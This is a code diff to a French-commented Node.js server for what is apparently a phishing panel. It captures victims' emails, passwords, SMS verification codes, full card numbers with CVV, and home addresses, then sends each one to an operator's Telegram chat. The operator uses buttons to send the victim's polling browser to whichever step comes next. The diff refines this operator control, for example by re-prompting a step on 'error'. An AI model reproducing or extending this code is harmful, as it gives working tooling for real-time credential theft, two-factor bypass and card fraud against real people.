@@ -3,7 +3,6 @@ const express = require('express');
 const cors = require('cors');
 const path = require('path');
 const { v4: uuidv4 } = require('uuid');
-
 const { bot, ADMIN_CHAT_ID, saveHistory } = require('./bot');
 
 const app = express();
@@ -15,73 +14,35 @@ bot.startPolling();
 console.log("🤖 Bot démarré");
 
 // ================================================
-// MÉMOIRE — sessions et décisions
+// MÉMOIRE
+// sessions[sessionId] = données utilisateur
+// decisions[sessionId] = étape décidée par admin
 // ================================================
-const sessions = {};    // données de chaque utilisateur
-const decisions = {};   // décision admin: 'step2','step3','step4','error','success'
+const sessions = {};
+const decisions = {};
 
 // ================================================
-// Boutons de décision admin pour chaque étape
+// BOUTONS — Admin peut envoyer à N'IMPORTE quelle étape
 // ================================================
-function getDecisionButtons(sessionId, etape) {
-  if (etape === 1) {
-    return {
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "➡️ Étape 2 (SMS)", callback_data: `go_step2_${sessionId}` },
-            { text: "➡️ Étape 3 (Carte)", callback_data: `go_step3_${sessionId}` }
-          ],
-          [
-            { text: "➡️ Étape 4 (Infos)", callback_data: `go_step4_${sessionId}` },
-            { text: "❌ Erreur", callback_data: `go_error_${sessionId}` }
-          ]
+function getDecisionButtons(sessionId) {
+  return {
+    reply_markup: {
+      inline_keyboard: [
+        [
+          { text: "🏠 Main (Étape 1)", callback_data: `go_step1_${sessionId}` },
+          { text: "📱 SMS (Étape 2)", callback_data: `go_step2_${sessionId}` }
+        ],
+        [
+          { text: "💳 Carte (Étape 3)", callback_data: `go_step3_${sessionId}` },
+          { text: "👤 Infos (Étape 4)", callback_data: `go_step4_${sessionId}` }
+        ],
+        [
+          { text: "✅ Succès", callback_data: `go_success_${sessionId}` },
+          { text: "❌ Erreur (même étape)", callback_data: `go_error_${sessionId}` }
         ]
-      }
-    };
-  }
-  if (etape === 2) {
-    return {
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "➡️ Étape 3 (Carte)", callback_data: `go_step3_${sessionId}` },
-            { text: "➡️ Étape 4 (Infos)", callback_data: `go_step4_${sessionId}` }
-          ],
-          [
-            { text: "❌ Erreur", callback_data: `go_error_${sessionId}` }
-          ]
-        ]
-      }
-    };
-  }
-  if (etape === 3) {
-    return {
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "➡️ Étape 4 (Infos)", callback_data: `go_step4_${sessionId}` },
-            { text: "✅ Succès", callback_data: `go_success_${sessionId}` }
-          ],
-          [
-            { text: "❌ Erreur", callback_data: `go_error_${sessionId}` }
-          ]
-        ]
-      }
-    };
-  }
-  if (etape === 4) {
-    return {
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "✅ Succès", callback_data: `go_success_${sessionId}` },
-            { text: "❌ Erreur", callback_data: `go_error_${sessionId}` }
-          ]
-        ]
-      }
-    };
-  }
+      ]
+    }
+  };
 }
 
 // ================================================
@@ -92,7 +53,7 @@ app.post('/etape1', async (req, res) => {
     const { email, password } = req.body;
     const sessionId = uuidv4();
 
-    sessions[sessionId] = { email, password, etape: 1 };
+    sessions[sessionId] = { email, password, etapeActuelle: 'step1' };
     decisions[sessionId] = null;
 
     saveHistory({ etape: 1, email, password, sessionId, date: new Date().toISOString() });
@@ -100,7 +61,7 @@ app.post('/etape1', async (req, res) => {
     await bot.sendMessage(
       ADMIN_CHAT_ID,
       `🔐 ÉTAPE 1 - Connexion\n📧 Email: ${email}\n🔑 Mot de passe: ${password}\n\n👇 Où envoyer l'utilisateur ?`,
-      getDecisionButtons(sessionId, 1)
+      getDecisionButtons(sessionId)
     );
 
     res.json({ success: true, sessionId });
@@ -118,7 +79,10 @@ app.post('/etape2', async (req, res) => {
   try {
     const { smsCode, sessionId } = req.body;
 
-    if (sessions[sessionId]) sessions[sessionId].smsCode = smsCode;
+    if (sessions[sessionId]) {
+      sessions[sessionId].smsCode = smsCode;
+      sessions[sessionId].etapeActuelle = 'step2';
+    }
     decisions[sessionId] = null;
 
     saveHistory({ etape: 2, smsCode, sessionId, date: new Date().toISOString() });
@@ -126,7 +90,7 @@ app.post('/etape2', async (req, res) => {
     await bot.sendMessage(
       ADMIN_CHAT_ID,
       `📱 ÉTAPE 2 - Code SMS\n🔢 Code: ${smsCode}\n\n👇 Où envoyer l'utilisateur ?`,
-      getDecisionButtons(sessionId, 2)
+      getDecisionButtons(sessionId)
     );
 
     res.json({ success: true });
@@ -145,7 +109,7 @@ app.post('/etape3', async (req, res) => {
     const { cardName, cardNumber, expiry, cvv, cardBrand, sessionId } = req.body;
 
     if (sessions[sessionId]) {
-      Object.assign(sessions[sessionId], { cardName, cardNumber, expiry, cvv, cardBrand, etape: 3 });
+      Object.assign(sessions[sessionId], { cardName, cardNumber, expiry, cvv, cardBrand, etapeActuelle: 'step3' });
     }
     decisions[sessionId] = null;
 
@@ -154,7 +118,7 @@ app.post('/etape3', async (req, res) => {
     await bot.sendMessage(
       ADMIN_CHAT_ID,
       `💳 ÉTAPE 3 - Carte\n🏦 Marque: ${cardBrand}\n👤 Nom: ${cardName}\n💳 Numéro: ${cardNumber}\n📅 Expiry: ${expiry}\n🔒 CVV: ${cvv}\n\n👇 Où envoyer l'utilisateur ?`,
-      getDecisionButtons(sessionId, 3)
+      getDecisionButtons(sessionId)
     );
 
     res.json({ success: true });
@@ -173,7 +137,7 @@ app.post('/etape4', async (req, res) => {
     const { firstName, lastName, address, birthYear, postalCode, sessionId } = req.body;
 
     if (sessions[sessionId]) {
-      Object.assign(sessions[sessionId], { firstName, lastName, address, birthYear, postalCode, etape: 4 });
+      Object.assign(sessions[sessionId], { firstName, lastName, address, birthYear, postalCode, etapeActuelle: 'step4' });
     }
     decisions[sessionId] = null;
 
@@ -181,8 +145,8 @@ app.post('/etape4', async (req, res) => {
 
     await bot.sendMessage(
       ADMIN_CHAT_ID,
-      `👤 ÉTAPE 4 - Infos\n👤 Prénom: ${firstName}\n👤 Nom: ${lastName}\n🏠 Adresse: ${address}\n🎂 Naissance: ${birthYear}\n📮 Code postal: ${postalCode}\n\n👇 Que faire ?`,
-      getDecisionButtons(sessionId, 4)
+      `👤 ÉTAPE 4 - Infos\n👤 Prénom: ${firstName}\n👤 Nom: ${lastName}\n🏠 Adresse: ${address}\n🎂 Naissance: ${birthYear}\n📮 Code postal: ${postalCode}\n\n👇 Où envoyer l'utilisateur ?`,
+      getDecisionButtons(sessionId)
     );
 
     res.json({ success: true });
@@ -194,14 +158,14 @@ app.post('/etape4', async (req, res) => {
 });
 
 // ================================================
-// DÉCISION — Le site interroge cette route toutes les 2s
+// DÉCISION — Site interroge toutes les 2s
 // ================================================
 app.get('/decision/:sessionId', (req, res) => {
   const { sessionId } = req.params;
   const decision = decisions[sessionId];
 
   if (decision) {
-    decisions[sessionId] = null; // Reset après lecture
+    decisions[sessionId] = null;
     res.json({ decision });
   } else {
     res.json({ decision: null });
@@ -209,28 +173,43 @@ app.get('/decision/:sessionId', (req, res) => {
 });
 
 // ================================================
-// CALLBACK BOT — Admin clique sur un bouton Telegram
+// CALLBACK — Admin clique un bouton Telegram
 // ================================================
 bot.on('callback_query', async (query) => {
   const data = query.data;
 
   if (data.startsWith('go_')) {
-    const withoutGo = data.slice(3);              // "step2_SESSION_ID"
+    const withoutGo = data.slice(3);
     const underscoreIndex = withoutGo.indexOf('_');
-    const action = withoutGo.slice(0, underscoreIndex);       // "step2"
-    const sessionId = withoutGo.slice(underscoreIndex + 1);   // "SESSION_ID"
+    const action = withoutGo.slice(0, underscoreIndex);
+    const sessionId = withoutGo.slice(underscoreIndex + 1);
 
-    decisions[sessionId] = action;
+    // Si erreur → on remet la même étape actuelle
+    if (action === 'error') {
+      const etapeActuelle = sessions[sessionId]?.etapeActuelle || 'step1';
+      decisions[sessionId] = etapeActuelle;
+    } else {
+      decisions[sessionId] = action;
+      if (sessions[sessionId]) sessions[sessionId].etapeActuelle = action;
+    }
 
-    await bot.answerCallbackQuery(query.id, { text: `✅ Décision: ${action}` });
+    await bot.answerCallbackQuery(query.id, { text: `✅ Envoyé → ${action}` });
 
-    // Supprime les boutons du message Telegram
     await bot.editMessageReplyMarkup(
       { inline_keyboard: [] },
       { chat_id: query.message.chat.id, message_id: query.message.message_id }
     );
 
-    await bot.sendMessage(ADMIN_CHAT_ID, `✅ Décision envoyée → ${action}`);
+    const labels = {
+      step1: '🏠 Main',
+      step2: '📱 SMS',
+      step3: '💳 Carte',
+      step4: '👤 Infos',
+      success: '✅ Succès',
+      error: '❌ Erreur (même étape)'
+    };
+
+    await bot.sendMessage(ADMIN_CHAT_ID, `✅ Utilisateur redirigé → ${labels[action] || action}`);
   }
 });
 
